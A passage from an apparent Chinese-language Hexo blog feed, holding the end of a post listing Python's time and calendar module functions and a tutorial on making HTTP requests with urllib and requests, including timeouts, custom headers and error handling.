8  9 10</span><br><span class="line">11 12 13 14 15 16 17</span><br><span class="line">18 19 20 21 22 23 24</span><br><span class="line">25 26 27 28 29 30 31</span><br></pre></td></tr></table></figure><hr><h4><span id="time-mo-kuai">Time 模块</span><a href="#time-mo-kuai" class="header-anchor">#</a></h4><p>Time 模块包含了以下内置函数，既有时间处理的，也有转换时间格式的：</p><table><thead><tr><th align="left">序号</th><th align="left">函数及描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><a href="https://www.runoob.com/python/att-time-altzone.html" target="_blank" rel="noopener">time.altzone</a> 返回格林威治西部的夏令时地区的偏移秒数。如果该地区在格林威治东部会返回负值（如西欧，包括英国）。对夏令时启用地区才能使用。</td></tr><tr><td align="left">2</td><td align="left"><a href="https://www.runoob.com/python/att-time-asctime.html" target="_blank" rel="noopener">time.asctime([tupletime])</a> 接受时间元组并返回一个可读的形式为”Tue Dec 11 18:07:14 2008”（2008年12月11日 周二18时07分14秒）的24个字符的字符串。</td></tr><tr><td align="left">3</td><td align="left"><a href="https://www.runoob.com/python/att-time-clock.html" target="_blank" rel="noopener">time.clock( )</a> 用以浮点数计算的秒数返回当前的CPU时间。用来衡量不同程序的耗时，比time.time()更有用。</td></tr><tr><td align="left">4</td><td align="left"><a href="https://www.runoob.com/python/att-time-ctime.html" target="_blank" rel="noopener">time.ctime([secs])</a> 作用相当于asctime(localtime(secs))，未给参数相当于asctime()</td></tr><tr><td align="left">5</td><td align="left"><a href="https://www.runoob.com/python/att-time-gmtime.html" target="_blank" rel="noopener">time.gmtime([secs])</a> 接收时间戳（1970纪元后经过的浮点秒数）并返回格林威治天文时间下的时间元组t。注：t.tm_isdst始终为0</td></tr><tr><td align="left">6</td><td align="left"><a href="https://www.runoob.com/python/att-time-localtime.html" target="_blank" rel="noopener">time.localtime([secs])</a> 接收时间戳（1970纪元后经过的浮点秒数）并返回当地时间下的时间元组t（t.tm_isdst可取0或1，取决于当地当时是不是夏令时）。</td></tr><tr><td align="left">7</td><td align="left"><a href="https://www.runoob.com/python/att-time-mktime.html" target="_blank" rel="noopener">time.mktime(tupletime)</a> 接受时间元组并返回时间戳（1970纪元后经过的浮点秒数）。</td></tr><tr><td align="left">8</td><td align="left"><a href="https://www.runoob.com/python/att-time-sleep.html" target="_blank" rel="noopener">time.sleep(secs)</a> 推迟调用线程的运行，secs指秒数。</td></tr><tr><td align="left">9</td><td align="left"><a href="https://www.runoob.com/python/att-time-strftime.html" target="_blank" rel="noopener">time.strftime(fmt[,tupletime])</a> 接收以时间元组，并返回以可读字符串表示的当地时间，格式由fmt决定。</td></tr><tr><td align="left">10</td><td align="left"><a href="https://www.runoob.com/python/att-time-strptime.html" target="_blank" rel="noopener">time.strptime(str,fmt=’%a %b %d %H:%M:%S %Y’)</a> 根据fmt的格式把一个时间字符串解析为时间元组。</td></tr><tr><td align="left">11</td><td align="left"><a href="https://www.runoob.com/python/att-time-time.html" target="_blank" rel="noopener">time.time( )</a> 返回当前时间的时间戳（1970纪元后经过的浮点秒数）。</td></tr><tr><td align="left">12</td><td align="left"><a href="https://www.runoob.com/python/att-time-tzset.html" target="_blank" rel="noopener">time.tzset()</a> 根据环境变量TZ重新初始化时间相关设置。</td></tr></tbody></table><p>Time模块包含了以下2个非常重要的属性：</p><table><thead><tr><th align="left">序号</th><th align="left">属性及描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><strong>time.timezone</strong> 属性time.timezone是当地时区（未启动夏令时）距离格林威治的偏移秒数（&gt;0，美洲;&lt;=0大部分欧洲，亚洲，非洲）。</td></tr><tr><td align="left">2</td><td align="left"><strong>time.tzname</strong> 属性time.tzname包含一对根据情况的不同而不同的字符串，分别是带夏令时的本地时区名称，和不带的。</td></tr></tbody></table><hr><h4><span id="ri-li-calendar-mo-kuai">日历（Calendar）模块</span><a href="#ri-li-calendar-mo-kuai" class="header-anchor">#</a></h4><p>此模块的函数都是日历相关的，例如打印某月的字符月历。</p><p>星期一是默认的每周第一天，星期天是默认的最后一天。更改设置需调用calendar.setfirstweekday()函数。模块包含了以下内置函数：</p><table><thead><tr><th align="left">序号</th><th align="left">函数及描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><strong>calendar.calendar(year,w=2,l=1,c=6)</strong> 返回一个多行字符串格式的year年年历，3个月一行，间隔距离为c。 每日宽度间隔为w字符。每行长度为21* W+18+2* C。l是每星期行数。</td></tr><tr><td align="left">2</td><td align="left"><strong>calendar.firstweekday( )</strong> 返回当前每周起始日期的设置。默认情况下，首次载入 calendar 模块时返回 0，即星期一。</td></tr><tr><td align="left">3</td><td align="left"><strong>calendar.isleap(year)</strong> 是闰年返回 True，否则为 False。<code>&gt;&gt;&gt; import calendar &gt;&gt;&gt; print(calendar.isleap(2000)) True &gt;&gt;&gt; print(calendar.isleap(1900)) False</code></td></tr><tr><td align="left">4</td><td align="left"><strong>calendar.leapdays(y1,y2)</strong> 返回在Y1，Y2两年之间的闰年总数。</td></tr><tr><td align="left">5</td><td align="left"><strong>calendar.month(year,month,w=2,l=1)</strong> 返回一个多行字符串格式的year年month月日历，两行标题，一周一行。每日宽度间隔为w字符。每行的长度为7* w+6。l是每星期的行数。</td></tr><tr><td align="left">6</td><td align="left"><strong>calendar.monthcalendar(year,month)</strong> 返回一个整数的单层嵌套列表。每个子列表装载代表一个星期的整数。Year年month月外的日期都设为0;范围内的日子都由该月第几日表示，从1开始。</td></tr><tr><td align="left">7</td><td align="left"><strong>calendar.monthrange(year,month)</strong> 返回两个整数。第一个是该月的星期几的日期码，第二个是该月的日期码。日从0（星期一）到6（星期日）;月从1到12。</td></tr><tr><td align="left">8</td><td align="left"><strong>calendar.prcal(year,w=2,l=1,c=6)</strong> 相当于 <strong>print calendar.calendar(year,w=2,l=1,c=6)</strong>。</td></tr><tr><td align="left">9</td><td align="left"><strong>calendar.prmonth(year,month,w=2,l=1)</strong> 相当于 <strong>print calendar.month(year,month,w=2,l=1)</strong> 。</td></tr><tr><td align="left">10</td><td align="left"><strong>calendar.setfirstweekday(weekday)</strong> 设置每周的起始日期码。0（星期一）到6（星期日）。</td></tr><tr><td align="left">11</td><td align="left"><strong>calendar.timegm(tupletime)</strong> 和time.gmtime相反：接受一个时间元组形式，返回该时刻的时间戳（1970纪元后经过的浮点秒数）。</td></tr><tr><td align="left">12</td><td align="left"><strong>calendar.weekday(year,month,day)</strong> 返回给定日期的日期码。0（星期一）到6（星期日）。月份为 1（一月） 到 12（12月）。</td></tr></tbody></table><hr><h4><span id="qi-ta-xiang-guan-mo-kuai-he-han-shu">其他相关模块和函数</span><a href="#qi-ta-xiang-guan-mo-kuai-he-han-shu" class="header-anchor">#</a></h4><p>在Python中，其他处理日期和时间的模块还有：</p><ul><li><a href="http://docs.python.org/library/datetime.html#module-datetime" target="_blank" rel="noopener">datetime模块</a></li><li><a href="http://www.twinsun.com/tz/tz-link.htm" target="_blank" rel="noopener">pytz模块</a></li><li><a href="http://labix.org/python-dateutil" target="_blank" rel="noopener">dateutil模块</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;&lt;span id=&quot;centos-huan-jing&quot;&gt;centos环境&lt;/span&gt;&lt;a href=&quot;#centos-huan-jing&quot; class=&quot;header-anchor&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;&lt;p&gt; &lt;a href=&quot;https://www.jianshu.
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>urllib的详解使用</title>
    <link href="http://yoursite.com/2019/11/11/urllib%E7%9A%84%E8%AF%A6%E8%A7%A3%E4%BD%BF%E7%94%A8/"/>
    <id>http://yoursite.com/2019/11/11/urllib的详解使用/</id>
    <published>2019-11-11T15:20:15.829Z</published>
    <updated>2019-11-11T15:41:38.318Z</updated>
    
    <content type="html"><![CDATA[<div class="toc"><!-- toc --><ul><li><a href="#urllib-de-xiang-jie-shi-yong">urllib的详解使用</a></li><li><a href="#requests-qing-qiu-fang-shi">requests请求方式</a></li><li><a href="#response-fang-fa">response方法</a></li></ul><!-- tocstop --></div><p><a href="http://httpbin.org/" target="_blank" rel="noopener">http://httpbin.org/</a> 爬虫测试网站</p><h1><span id="urllib-de-xiang-jie-shi-yong">urllib的详解使用</span><a href="#urllib-de-xiang-jie-shi-yong" class="header-anchor">#</a></h1><p>我们首先了解一下 Urllib 库，它是 Python 内置的 HTTP 请求库，也就是说我们不需要额外安装即可使用，它包含四个模块：</p><ul><li>第一个模块 request，它是最基本的 HTTP 请求模块，我们可以用它来模拟发送一请求，就像在浏览器里输入网址然后敲击回车一样，只需要给库方法传入 URL 还有额外的参数，就可以模拟实现这个过程了。</li><li>第二个 error 模块即异常处理模块，如果出现请求错误，我们可以捕获这些异常，然后进行重试或其他操作保证程序不会意外终止。</li><li>第三个 parse 模块是一个工具模块，提供了许多 URL 处理方法，比如拆分、解析、合并等等的方法。</li><li>第四个模块是 robotparser，主要是用来识别网站的 robots.txt 文件，然后判断哪些网站可以爬，哪些网站不可以爬的，其实用的比较少。<br>在这里重点对前三个模块进行下讲解。</li></ul><h4><span id="yi-fa-song-qing-qiu">一、发送请求</span><a href="#yi-fa-song-qing-qiu" class="header-anchor">#</a></h4><p>使用 Urllib 的 request 模块我们可以方便地实现 Request 的发送并得到 Response</p><ul><li><h5><span id="1-urlopen">1、urlopen()</span><a href="#1-urlopen" class="header-anchor">#</a></h5></li></ul><p>urllib.request 模块提供了最基本的构造 HTTP 请求的方法，利用它可以模拟浏览器的一个请求发起过程，同时它还带有处理authenticaton（授权验证），redirections（重定向)，cookies（浏览器Cookies）以及其它内容。<br>我们来感受一下它的强大之处，以 Python 官网为例，我们来把这个网页抓下来：</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">response = urllib.request.urlopen(<span class="string">'https://www.python.org'</span>)</span><br><span class="line"><span class="built_in">print</span>(response.read().decode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="https://upload-images.jianshu.io/upload_images/11457134-2750fdef0827e53c.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/772/format/webp" alt="img"></p><p>1.jpg</p><p>接下来我们看下它返回的到底是什么，利用 type() 方法输出 Response 的类型。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">response = urllib.request.urlopen(<span class="string">'https://www.python.org'</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="keyword">type</span>(response))</span><br></pre></td></tr></table></figure><p>输出结果如下：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">http</span>.<span class="title">client</span>.<span class="title">HTTPResponse</span>'&gt;</span></span><br></pre></td></tr></table></figure><p>通过输出结果可以发现它是一个 HTTPResposne 类型的对象，它主要包含的方法有 read()、readinto()、getheader(name)、getheaders()、fileno() 等方法和 msg、version、status、reason、debuglevel、closed 等属性。<br>得到这个对象之后，我们把它赋值为 response 变量，然后就可以调用这些方法和属性，得到返回结果的一系列信息了。+</p><p>例如调用 read() 方法可以得到返回的网页内容，调用 status 属性就可以得到返回结果的状态码，如 200 代表请求成功，404 代表网页未找到等。</p><p>下面再来一个实例感受一下：</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">response = urllib.request.urlopen(<span class="string">'https://www.python.org'</span>)</span><br><span class="line"><span class="built_in">print</span>(response.status)</span><br><span class="line"><span class="built_in">print</span>(response.getheaders())</span><br><span class="line"><span class="built_in">print</span>(response.getheader(<span class="string">'Server'</span>))</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">200</span><br><span class="line">[(<span class="string">'Server'</span>, <span class="string">'nginx'</span>), (<span class="string">'Content-Type'</span>, <span class="string">'text/html; charset=utf-8'</span>), (<span class="string">'X-Frame-Options'</span>, <span class="string">'SAMEORIGIN'</span>), (<span class="string">'X-Clacks-Overhead'</span>, <span class="string">'GNU Terry Pratchett'</span>), (<span class="string">'Content-Length'</span>, <span class="string">'47397'</span>), (<span class="string">'Accept-Ranges'</span>, <span class="string">'bytes'</span>), (<span class="string">'Date'</span>, <span class="string">'Mon, 01 Aug 2016 09:57:31 GMT'</span>), (<span class="string">'Via'</span>, <span class="string">'1.1 varnish'</span>), (<span class="string">'Age'</span>, <span class="string">'2473'</span>), (<span class="string">'Connection'</span>, <span class="string">'close'</span>), (<span class="string">'X-Served-By'</span>, <span class="string">'cache-lcy1125-LCY'</span>), (<span class="string">'X-Cache'</span>, <span class="string">'HIT'</span>), (<span class="string">'X-Cache-Hits'</span>, <span class="string">'23'</span>), (<span class="string">'Vary'</span>, <span class="string">'Cookie'</span>), (<span class="string">'Strict-Transport-Security'</span>, <span class="string">'max-age=63072000; includeSubDomains'</span>)]</span><br><span class="line">nginx</span><br></pre></td></tr></table></figure><p>可见，三个输出分别输出了响应的状态码，响应的头信息，以及通过调用 getheader() 方法并传递一个参数 Server 获取了 headers 中的 Server 值，结果是 nginx，意思就是服务器是 nginx 搭建的。<br>利用以上最基本的 urlopen() 方法，我们可以完成最基本的简单网页的 GET 请求抓取。<br>如果我们想给链接传递一些参数该怎么实现呢？我们首先看一下 urlopen() 函数的API：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">urllib.request.urlopen(url, data=<span class="literal">None</span>, [timeout, ]*, cafile=<span class="literal">None</span>, capath=<span class="literal">None</span>, cadefault=<span class="literal">False</span>, context=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure><p>可以发现除了第一个参数可以传递 URL 之外，我们还可以传递其它的内容，比如 data（附加数据）、timeout（超时时间）等等。<br>下面我们详细说明下这几个参数的用法:</p><ul><li><h5><span id="data-can-shu">data参数</span><a href="#data-can-shu" class="header-anchor">#</a></h5></li></ul><p>data 参数是可选的，如果要添加 data，它要是字节流编码格式的内容，即 bytes 类型，通过 bytes() 方法可以进行转化，另外如果传递了这个 data 参数，它的请求方式就不再是 GET 方式请求，而是 POST。</p><p>下面用一个实例来感受一下：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line"><span class="keyword">data</span> = bytes(urllib.parse.urlencode(&#123;<span class="string">'word'</span>: <span class="string">'hello'</span>&#125;), encoding=<span class="string">'utf8'</span>)</span><br><span class="line">response = urllib.request.urlopen(<span class="string">'http://httpbin.org/post'</span>, <span class="keyword">data</span>=<span class="keyword">data</span>)</span><br><span class="line">print(response.read())</span><br></pre></td></tr></table></figure><p>在这里我们传递了一个参数 word，值是 hello。它需要被转码成bytes（字节流）类型。其中转字节流采用了 bytes() 方法，第一个参数需要是 str（字符串）类型，需要用 urllib.parse 模块里的 urlencode() 方法来将参数字典转化为字符串。第二个参数指定编码格式，在这里指定为 utf8。</p><ul><li><h5><span id="timeout-can-shu">timeout参数</span><a href="#timeout-can-shu" class="header-anchor">#</a></h5></li></ul><p>timeout 参数可以设置超时时间，单位为秒，意思就是如果请求超出了设置的这个时间还没有得到响应，就会抛出异常，如果不指定，就会使用全局默认时间。它支持 HTTP、HTTPS、FTP 请求。<br>因此我们可以通过设置这个超时时间来控制一个网页如果长时间未响应就跳过它的抓取，利用 try except 语句就可以实现这样的操作，代码如下：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> urllib.error</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = urllib.request.urlopen('http:<span class="comment">//httpbin.org/get', timeout=0.1)</span></span><br><span class="line">except urllib.error.<span class="type">URLError</span> <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">if</span> isinstance(e.reason, socket.timeout):</span><br><span class="line">        <span class="built_in">print</span>('<span class="type">TIME</span> <span class="type">OUT'</span>)</span><br></pre></td></tr></table></figure><ul><li><h5><span id="qi-ta-can-shu">其他参数</span><a href="#qi-ta-can-shu" class="header-anchor">#</a></h5></li></ul><p>还有 context 参数，它必须是 ssl.SSLContext 类型，用来指定 SSL 设置。<br>cafile 和 capath 两个参数是指定 CA 证书和它的路径，这个在请求 HTTPS 链接时会有用。<br>cadefault 参数现在已经弃用了，默认为 False。<br>以上讲解了 urlopen() 方法的用法，通过这个最基本的函数可以完成简单的请求和网页抓取，如需更加详细了解，可以参见官方文档：<a href="https://docs.python.org/3/library/urllib.request.html。" target="_blank" rel="noopener">https://docs.python.org/3/library/urllib.request.html。</a></p><ul><li><h4><span id="2-request">2、Request</span><a href="#2-request" class="header-anchor">#</a></h4></li></ul><p>由上我们知道利用 urlopen() 方法可以实现最基本请求的发起，但这几个简单的参数并不足以构建一个完整的请求，如果请求中需要加入 Headers 等信息，我们就可以利用更强大的 Request 类来构建一个请求。<br>首先我们用一个实例来感受一下 Request 的用法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mport urllib.request</span><br><span class="line"></span><br><span class="line">request = urllib.request.Request(<span class="string">'https://python.org'</span>)</span><br><span class="line">response = urllib.request.urlopen(request)</span><br><span class="line"><span class="built_in">print</span>(response.read().decode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure><p>可以发现，我们依然是用 urlopen() 方法来发送这个请求，只不过这次 urlopen() 方法的参数不再是一个 URL，而是一个 Request 类型的对象，通过构造这个这个数据结构，一方面我们可以将请求独立成一个对象，另一方面可配置参数更加丰富和灵活。<br>下面我们看一下 Request 都可以通过怎样的参数来构造，它的构造方法如下：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">urllib</span>.<span class="title">request</span>.<span class="title">Request</span></span>(url, <span class="keyword">data</span>=None, headers=&#123;&#125;, origin_req_host=None, unverifiable=False, method=None)</span><br></pre></td></tr></table></figure><p>第一个 url 参数是请求 URL，这个是必传参数，其他的都是可选参数。<br>第二个 data 参数如果要传必须传 bytes（字节流）类型的，如果是一个字典，可以先用 urllib.parse 模块里的 urlencode() 编码。<br>第三个 headers 参数是一个字典，这个就是 Request Headers 了，你可以在构造 Request 时通过 headers 参数直接构造，也可以通过调用 Request 实例的 add_header() 方法来添加, Request Headers 最常用的用法就是通过修改 User-Agent 来伪装浏览器，默认的 User-Agent 是 Python-urllib，我们可以通过修改它来伪装浏览器。<br>第四个 origin_req_host 参数指的是请求方的 host 名称或者 IP 地址。<br>第五个 unverifiable 参数指的是这个请求是否是无法验证的，默认是False。意思就是说用户没有足够权限来选择接收这个请求的结果。例如我们请求一个 HTML 文档中的图片，但是我们没有自动抓取图像的权限，这时 unverifiable 的值就是 True。<br>第六个 method 参数是一个字符串，它用来指示请求使用的方法，比如GET，POST，PUT等等。</p><p>写个例子：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from urllib <span class="keyword">import</span> request, parse</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://httpbin.org/post'</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'</span>,</span><br><span class="line">    <span class="string">'Host'</span>: <span class="string">'httpbin.org'</span></span><br><span class="line">&#125;</span><br><span class="line">dict = &#123;</span><br><span class="line">    <span class="string">'name'</span>: <span class="string">'Germey'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">data</span> = bytes(parse.urlencode(dict), encoding=<span class="string">'utf8'</span>)</span><br><span class="line">req = request.Request(url=url, <span class="keyword">data</span>=<span class="keyword">data</span>, headers=headers, method=<span class="string">'POST'</span>)</span><br><span class="line">response = request.urlopen(req)</span><br><span class="line">print(response.read().decode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure><p>在这里我们通过四个参数构造了一个 Request，url 即请求 URL，在headers 中指定了 User-Agent 和 Host，传递的参数 data 用了 urlencode() 和 bytes() 方法来转成字节流，另外指定了请求方式为 POST。<br>通过观察结果可以发现，我们成功设置了 data，headers 以及 method。<br>另外 headers 也可以用 add_header() 方法来添加。</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">req = request.Request(url=url, <span class="keyword">data</span>=<span class="keyword">data</span>, method=<span class="string">'POST'</span>)</span><br><span class="line">req.add_header(<span class="string">'User-Agent'</span>, <span class="string">'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'</span>)</span><br></pre></td></tr></table></figure><p>如此一来，我们就可以更加方便地构造一个 Request，实现请求的发送啦。</p><h4><span id="er-chu-li-yi-chang">二、 处理异常</span><a href="#er-chu-li-yi-chang" class="header-anchor">#</a></h4><p>我们了解了 Request 的发送过程，但是在网络情况不好的情况下，出现了异常怎么办呢？这时如果我们不处理这些异常，程序很可能报错而终止运行，所以异常处理还是十分有必要的。+</p><p>Urllib 的 error 模块定义了由 request 模块产生的异常。如果出现了问题，request 模块便会抛出 error 模块中定义的异常。</p><p>主要有这两个处理异常类，<code>URLError</code>,<code>HTTPError</code><br>下面写个例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request, error</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = request.urlopen(<span class="string">'http://cuiqingcai.com/index.htm'</span>)</span><br><span class="line"><span class="keyword">except</span> error.URLError <span class="keyword">as</span> e:</span><br><span class="line">    print(e.reason)</span><br></pre></td></tr></table></figure><p>我们打开一个不存在的页面，照理来说应该会报错，但是这时我们捕获了 URLError 这个异常，运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Not Found</span><br><span class="line">from urllib import request,error</span><br><span class="line">try:</span><br><span class="line">    response = request.urlopen(&apos;http://cuiqingcai.com/index.htm&apos;)</span><br><span class="line">except error.HTTPError as e:</span><br><span class="line">    print(e.reason, e.code, e.headers, seq=&apos;\n&apos;)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Not Found</span><br><span class="line"><span class="number">404</span></span><br><span class="line">Server: nginx/<span class="number">1.4</span><span class="number">.6</span> (Ubuntu)</span><br><span class="line"><span class="built_in">Date</span>: Wed, <span class="number">03</span> Aug <span class="number">2016</span> <span class="number">08</span>:<span class="number">54</span>:<span class="number">22</span> GMT</span><br><span class="line">Content-Type: text/html; charset=UTF<span class="number">-8</span></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Connection: close</span><br><span class="line">X-Powered-By: PHP/<span class="number">5.5</span><span class="number">.9</span><span class="number">-1</span>ubuntu4<span class="number">.14</span></span><br><span class="line">Vary: Cookie</span><br><span class="line">Expires: Wed, <span class="number">11</span> Jan <span class="number">1984</span> <span class="number">05</span>:<span class="number">00</span>:<span class="number">00</span> GMT</span><br><span class="line">Cache-Control: no-cache, must-revalidate, max-age=<span class="number">0</span></span><br><span class="line">Pragma: no-cache</span><br><span class="line">Link: <span class="xml"><span class="tag">&lt;<span class="name">http:</span>//<span class="attr">cuiqingcai.com</span>/<span class="attr">wp-json</span>/&gt;</span></span>; rel=<span class="string">"https://api.w.org/"</span></span><br></pre></td></tr></table></figure><p>HTTPError,它有三个属性。</p><ul><li>code，返回 HTTP Status Code，即状态码，比如 404 网页不存在，500 服务器内部错误等等。</li><li>reason，同父类一样，返回错误的原因。</li><li>headers，返回 Request Headers。<br>因为 URLError 是 HTTPError 的父类，所以我们可以先选择捕获子类的错误，再去捕获父类的错误，所以上述代码更好的写法如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request, error</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = request.urlopen(<span class="string">'http://cuiqingcai.com/index.htm'</span>)</span><br><span class="line"><span class="keyword">except</span> error.HTTPError <span class="keyword">as</span> e:</span><br><span class="line">    print(e.reason, e.code, e.headers, sep=<span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">except</span> error.URLError <span class="keyword">as</span> e:</span><br><span class="line">    print(e.reason)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'Request Successfully'</span>)</span><br></pre></td></tr></table></figure><p>这样我们就可以做到先捕获 HTTPError，获取它的错误状态码、原因、Headers 等详细信息。如果非 HTTPError，再捕获 URLError 异常，输出错误原因。最后用 else 来处理正常的逻辑，这是一个较好的异常处理写法。</p><h1><span id></span><a href="#" class="header-anchor">#</a></h1><h1><span id="requests-qing-qiu-fang-shi">requests请求方式</span><a href="#requests-qing-qiu-fang-shi" class="header-anchor">#</a></h1><p>Requests是用python语言基于urllib编写的，采用的是Apache2 Licensed开源协议的HTTP库。与urllib相比，Requests更加方便，可以节约我们大量的工作，建议爬虫使用Requests库。</p><p>requests提供的请求各个请求方式：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">import</span> <span class="selector-tag">requests</span></span><br><span class="line"><span class="selector-tag">requests</span><span class="selector-class">.get</span>(<span class="selector-tag">url</span>)</span><br><span class="line"><span class="selector-tag">requests</span><span class="selector-class">.post</span>(<span class="selector-tag">url</span>)</span><br><span class="line"><span class="selector-tag">requests</span><span class="selector-class">.put</span>(<span class="selector-tag">url</span>)</span><br><span class="line"><span class="selector-tag">requests</span><span class="selector-class">.delete</span>(<span class="selector-tag">url</span>)</span><br><span class="line"><span class="selector-tag">requests</span><span class="selector-class">.head</span>(<span class="selector-tag">url</span>)</span><br><span class="line"><span class="selector-tag">requests</span><span class="selector-class">.options</span>(<span class="selector-tag">url</span>)</span><br></pre></td></tr></table></figure><h5><span id="get-qing-qiu">get请求</span><a href="#get-qing-qiu" class="header-anchor">#</a></h5><p>get请求核心代码是requests.get(url)，具体例子如下：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = 'http:<span class="comment">//baidu.com'</span></span><br><span class="line">response = requests.<span class="keyword">get</span>(url)</span><br><span class="line"><span class="built_in">print</span>(response)</span><br></pre></td></tr></table></figure><p>打印出来的结果是：&lt;Response [200]&gt;。&lt;&gt;表示这是一个对象，也就是我们这里获取的是一个response的对象，200表示状态码。</p><p><img src="https://upload-images.jianshu.io/upload_images/15064033-b7d2820a38d78488.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1009/format/webp" alt="img"></p><p>requests get 请求.png</p><h5><span id="post-qing-qiu">post请求</span><a href="#post-qing-qiu" class="header-anchor">#</a></h5><p>post请求核心代码是requests.post(url,data={请求体的字典})，具体例子（百度翻译）如下：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 